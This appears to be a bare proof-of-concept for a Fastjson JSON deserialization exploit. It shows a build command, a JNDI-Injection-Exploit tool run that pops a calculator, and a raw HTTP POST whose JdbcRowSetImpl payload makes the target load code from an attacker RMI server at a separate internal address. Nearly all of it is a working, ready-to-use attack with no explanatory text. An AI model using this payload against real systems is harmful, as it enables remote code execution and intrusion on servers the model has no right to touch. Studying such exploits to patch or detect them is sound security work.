 mvn clean package -DskipTests

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Calculator.app" -A "127.0.0.1"
 
 
POST / HTTP/1.1
Host: 10.0.197.178:8090
Content-Type: application/json;charset=UTF-8
Content-Length: 260
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://10.0.196.59:1099/9qdegn",
        "autoCommit":true
    }
}